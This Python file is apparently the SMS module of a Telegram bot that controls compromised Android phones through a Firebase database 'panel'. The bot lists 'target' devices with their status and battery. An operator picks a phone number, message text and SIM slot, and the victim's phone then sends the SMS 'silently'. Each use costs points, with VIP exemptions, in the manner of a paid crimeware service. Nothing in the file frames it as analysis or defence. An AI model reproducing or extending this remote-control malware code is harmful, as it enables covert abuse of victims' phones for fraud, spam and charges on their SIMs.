import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from bot.models.user_model import update_user_points
from bot.models.settings_model import get_setting
from bot.services.firebase_service import send_command
from bot.services.firebase.fetch_devices import fetch_all_devices
from bot.middlewares.ban_check import ban_check
from bot.middlewares.points_check import points_required

logger = logging.getLogger(__name__)

# State constants for the conversation
SELECTING_DEVICE, ENTERING_PHONE, ENTERING_MESSAGE, SELECTING_SIM = range(4)

from bot.middlewares.feature_toggle import feature_enabled
from bot.middlewares.rate_limit import rate_limit

@ban_check
@feature_enabled("f_send_sms")
@points_required("send_sms")
@rate_limit(cooldown_seconds=10)
async def send_sms_flow_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Step 1: Displays connected devices on the active default panel.
    """
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    active_panel = context.user_data.get("active_panel")
    
    if not active_panel:
        keyboard = [[InlineKeyboardButton("📋 My Panels", callback_data="my_panels")],
                    [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]]
        await query.edit_message_text(
            "⚠️ **No Active Panel!**\n\nYou must first select or add an active commanding panel from the menu.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return ConversationHandler.END

    await query.edit_message_text("🔄 Connecting to Firebase and scanning for registered devices...")
    
    # Fetch devices of active board
    devices = await fetch_all_devices(active_panel)
    if not devices:
        await query.edit_message_text(
            "⚠️ **No registered devices found on this panel!**\n\n"
            "Make sure your target device app is online and linked to this Firebase Realtime Database.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_to_menu")]])
        )
        return ConversationHandler.END
        
    text = "📨 **Send custom SMS command**\n\nSelect a registered target device to trigger silent messaging:"
    keyboard = []
    
    for dev_id, dev_info in devices.items():
        if not isinstance(dev_info, dict):
            continue
        brand = dev_info.get("brand", "Generic Android Device")
        status = "🔴" if dev_info.get("status") == "offline" else "🟢"
        bat = dev_info.get("battery", "N/A")
        
        button_lbl = f"{status} {brand} (⚡ {bat})"
        keyboard.append([InlineKeyboardButton(button_lbl, callback_data=f"senddev_{dev_id}")])
    
    context.user_data["sms_devices_cache"] = devices
        
    keyboard.append([InlineKeyboardButton("❌ Cancel Execution", callback_data="cancel_sms")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    return SELECTING_DEVICE

async def device_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Step 2: Saves selected device ID and prompts for phone number.
    """
    query = update.callback_query
    await query.answer()
    
    device_id = query.data.split("_")[1]
    context.user_data["send_sms_device_id"] = device_id
    
    await query.edit_message_text(
        "📱 **Input Target Phone Number:**\n\nEnter the recipient's phone number with international country codes (e.g., `+919876543210`):"
    )
    return ENTERING_PHONE

async def phone_entered_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Step 3: Saves phone number and requests message text.
    """
    phone = update.message.text.strip()
    context.user_data["send_sms_phone"] = phone
    
    await update.message.reply_text(
        "📝 **Input Message Text:**\n\nType the custom SMS content you would like the target device to send silently:"
    )
    return ENTERING_MESSAGE

async def message_entered_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Step 4: Saves message and asks to choose SIM Slot.
    """
    msg_text = update.message.text.strip()
    context.user_data["send_sms_text"] = msg_text
    
    keyboard = [
        [InlineKeyboardButton("Slot 1 (SIM 1)", callback_data="sendsim_1"),
         InlineKeyboardButton("Slot 2 (SIM 2)", callback_data="sendsim_2")],
        [InlineKeyboardButton("❌ Cancel Action", callback_data="cancel_sms")]
    ]
    await update.message.reply_text(
        "🎴 **Choose SIM Slot:**\n\nSelect which SIM card slot on the target device should route this silent custom text:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return SELECTING_SIM

async def sim_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Step 5: Sends Firebase PATCH payload and confirms execution complete.
    """
    query = update.callback_query
    await query.answer()
    
    sim_slot = query.data.split("_")[1]
    user_id = query.from_user.id
    
    # Retrieve parameters from context state
    firebase_url = context.user_data.get("active_panel")
    device_id = context.user_data.get("send_sms_device_id")
    phone = context.user_data.get("send_sms_phone")
    text = context.user_data.get("send_sms_text")
    
    devices_cache = context.user_data.get("sms_devices_cache", {})
    dev_info = devices_cache.get(device_id, {})
    node_path = dev_info.get("node_path", "user_data")
    
    await query.edit_message_text("⚡ Relaying custom SMS payload to your target Firebase node...")
    
    cost = await get_setting("cost_send_sms", 10)
    from bot.models.user_model import get_user
    user_record = await get_user(user_id)
    is_vip = user_record.get("is_vip", False) if user_record else False
    
    if not is_vip:
        new_bal = await update_user_points(user_id, -cost)
        if new_bal is None:
            await query.edit_message_text(f"🚫 **Insufficient Points!** You need {cost} points to send SMS.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]]))
            return ConversationHandler.END
            
    # Send patch to firebase
    success = await send_command(
        firebase_url=firebase_url,
        device_id=device_id,
        command="send message",
        phone=phone,
        text=text,
        sim=sim_slot,
        node_path=node_path
    )
    
    if success:
        success_msg = (
            f"✅ **Silent SMS Relayed Successfully!**\n\n"
            f"📱 **Target Device:** `{device_id}`\n"
            f"📞 **Sent To:** `{phone}`\n"
            f"🎴 **Slot Routed:** `SIM {sim_slot}`\n\n"
        )
        if not is_vip:
            success_msg += f"Wallet updated: Fee of **{cost} points** deducted."
        await query.edit_message_text(success_msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]]))
    else:
        if not is_vip:
            await update_user_points(user_id, cost)
        await query.edit_message_text(
            "❌ **Failed to Relayed SMS!**\n\nCould not update the Firebase document node. The server returned a parsing failure. Please verify endpoints.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_to_menu")]])
        )
        
    # Clean up state dictionary
    context.user_data.pop("send_sms_device_id", None)
    context.user_data.pop("send_sms_phone", None)
    context.user_data.pop("send_sms_text", None)
    
    return ConversationHandler.END

async def cancel_sms_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Forcefully ends SMS state.
    """
    query = update.callback_query
    if query:
        await query.answer()
        await query.edit_message_text("❌ Sending process dropped.")
    else:
        await update.message.reply_text("❌ Action cancelled.")
    return ConversationHandler.END
